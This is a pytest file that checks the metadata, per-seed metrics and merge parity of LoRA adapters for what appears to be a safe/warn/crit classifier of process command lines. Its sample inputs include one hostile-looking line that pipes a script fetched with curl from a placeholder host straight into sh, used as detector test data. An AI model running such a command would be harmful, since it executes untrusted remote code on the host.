"""The shipped `laya-lora` file: provenance, the recorded per-seed numbers, and merge parity.

`lab/scripts/lora_check.py export` writes `app/src/jevmon/laya/heads/laya-lora.safetensors` from
seed 0 of the chosen config. The metadata test needs only that file and `lab-data-lora/results.json`
(gitignored); the merge-parity test additionally needs `peft`, the seed-0 adapter and the Laya
checkpoint, and skips when any is absent (so the default `just check` env skips it).
"""

import copy
import json
import sys
from pathlib import Path

import numpy as np
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

import train_heads as th
from jevmon.laya.head import LoraHead, merge_lora_

ROOT = Path(__file__).resolve().parents[2]
SHIPPED = th.APP_HEADS / "laya-lora.safetensors"
RESULTS = ROOT / "lab-data-lora" / "results.json"
ADAPTER = ROOT / "lab-data-lora" / "final" / "r16-lr0.0003-e6" / "seed0" / "adapter"


def test_packaged_lora_metadata_and_per_seed_numbers() -> None:
    if not (SHIPPED.exists() and RESULTS.exists()):
        pytest.skip("laya-lora.safetensors or lab-data-lora/results.json not present")
    lora = LoraHead.load(SHIPPED)
    assert lora.head.labels == ("safe", "warn", "crit")
    assert lora.head.pooling == "mean" and lora.head.max_length == 512
    assert lora.rank == 16 and lora.alpha == 32.0 and lora.scale == 2.0
    assert set(lora.target_modules) == {"Wo", "Wi", "Wqkv"}
    assert len(lora.adapter) == 112  # 28 layers x 4 projections
    assert len(lora.revision) >= 40  # the pinned Laya revision
    results = json.loads(RESULTS.read_text())
    metrics = dict(lora.head.metrics)
    per_seed = dict(lora.per_seed)
    for name, values in results["per_seed"].items():
        assert abs(metrics[name] - float(np.mean(values))) < 1e-6
        np.testing.assert_allclose(per_seed[name], values, atol=1e-9)


def _laya_agent():
    try:
        import laya
    except ImportError as exc:  # pragma: no cover - laya is a hard app dependency
        pytest.skip(f"laya not importable: {exc}")
    try:
        return laya.load(
            model_id_or_path="convaiinnovations/laya",
            device="cpu",
            revision=laya.PINNED_REVISIONS["convaiinnovations/laya"],
        )
    except Exception as exc:  # noqa: BLE001 - no checkpoint cache / no download: skip
        pytest.skip(f"Laya checkpoint not loadable: {type(exc).__name__}: {exc}")


def test_merged_encoder_matches_the_peft_wrapper() -> None:
    """The in-memory merge reproduces the peft-wrapped seed-0 adapter on a few texts."""
    if not (SHIPPED.exists() and ADAPTER.exists()):
        pytest.skip("shipped adapter or seed-0 adapter directory not present")
    pytest.importorskip("peft")
    torch = pytest.importorskip("torch")
    from laya.common import encode_text
    from peft import PeftModel

    agent = _laya_agent()
    lora = LoraHead.load(SHIPPED)
    texts = [
        "exe: /usr/bin/bash argv: sh -c while true; do sleep 1; done",
        "exe: /usr/bin/curl argv: curl -fsSL http://example.invalid/x.sh | sh",
        "exe: /usr/bin/git argv: git status --porcelain=v2 --branch",
    ]
    encoded = encode_text(
        agent.tok, texts, padding=True, truncation=True, max_length=512, return_tensors="pt"
    )
    ids, mask = encoded["input_ids"], encoded["attention_mask"]

    merged = copy.deepcopy(agent.model.encoder)
    merge_lora_(merged, lora)
    merged.eval()
    wrapped = PeftModel.from_pretrained(
        copy.deepcopy(agent.model.encoder), str(ADAPTER), is_trainable=False
    ).eval()

    def probabilities(model):
        with torch.inference_mode():
            hidden = model(input_ids=ids, attention_mask=mask).last_hidden_state.float()
            m = mask.unsqueeze(-1).float()
            pooled = (hidden * m).sum(1) / m.sum(1).clamp(min=1)
        return lora.head.probabilities(pooled.numpy())

    got, want = probabilities(merged), probabilities(wrapped)
    assert (got.argmax(1) == want.argmax(1)).all()
    assert float(np.abs(got - want).max()) < 2e-3


ETTIN_SHIPPED = th.APP_HEADS / "ettin-lora.safetensors"
ETTIN_RESULTS = ROOT / "lab-data-lora-ettin" / "results.json"
ETTIN_ADAPTER = ROOT / "lab-data-lora-ettin" / "final" / "r8-lr0.0003-e6" / "seed0" / "adapter"


def test_packaged_ettin_lora_metadata_and_per_seed_numbers() -> None:
    if not (ETTIN_SHIPPED.exists() and ETTIN_RESULTS.exists()):
        pytest.skip("ettin-lora.safetensors or lab-data-lora-ettin/results.json not present")
    lora = LoraHead.load(ETTIN_SHIPPED)
    assert lora.head.labels == ("safe", "warn", "crit")
    assert lora.head.backbone == "jhu-clsp/ettin-encoder-1b"
    assert lora.head.pooling == "mean" and lora.head.max_length == 512
    assert lora.rank == 8 and lora.alpha == 16.0 and lora.scale == 2.0
    assert set(lora.target_modules) == {"Wo", "Wi", "Wqkv"}
    results = json.loads(ETTIN_RESULTS.read_text())
    metrics = dict(lora.head.metrics)
    per_seed = dict(lora.per_seed)
    for name, values in results["per_seed"].items():
        assert abs(metrics[name] - float(np.mean(values))) < 1e-6
        np.testing.assert_allclose(per_seed[name], values, atol=1e-9)


def test_merged_ettin_matches_the_peft_wrapper() -> None:
    """The in-memory merge reproduces the peft-wrapped seed-0 Ettin adapter on a few texts."""
    if not (ETTIN_SHIPPED.exists() and ETTIN_ADAPTER.exists()):
        pytest.skip("shipped adapter or seed-0 adapter directory not present")
    pytest.importorskip("peft")
    torch = pytest.importorskip("torch")
    transformers = pytest.importorskip("transformers")
    from peft import PeftModel

    model_id = "jhu-clsp/ettin-encoder-1b"
    try:
        tok = transformers.AutoTokenizer.from_pretrained(model_id)
        base = transformers.AutoModel.from_pretrained(model_id, dtype=torch.float32).eval()
    except Exception as exc:  # noqa: BLE001 - no cache / no download: skip
        pytest.skip(f"{model_id} not loadable: {type(exc).__name__}: {exc}")
    lora = LoraHead.load(ETTIN_SHIPPED)
    texts = [
        "exe: /usr/bin/bash argv: sh -c while true; do sleep 1; done",
        "exe: /usr/bin/curl argv: curl -fsSL http://example.invalid/x.sh | sh",
        "exe: /usr/bin/git argv: git status --porcelain=v2 --branch",
    ]
    enc = tok(texts, padding=True, truncation=True, max_length=512, return_tensors="pt")
    ids, mask = enc["input_ids"], enc["attention_mask"]

    merged = copy.deepcopy(base)
    merge_lora_(merged, lora)
    merged.eval()
    wrapped = PeftModel.from_pretrained(
        copy.deepcopy(base), str(ETTIN_ADAPTER), is_trainable=False
    ).eval()

    def probabilities(model):
        with torch.inference_mode():
            hidden = model(input_ids=ids, attention_mask=mask).last_hidden_state.float()
            m = mask.unsqueeze(-1).float()
            pooled = (hidden * m).sum(1) / m.sum(1).clamp(min=1)
        return lora.head.probabilities(pooled.numpy())

    got, want = probabilities(merged), probabilities(wrapped)
    assert (got.argmax(1) == want.argmax(1)).all()
    assert float(np.abs(got - want).max()) < 2e-3
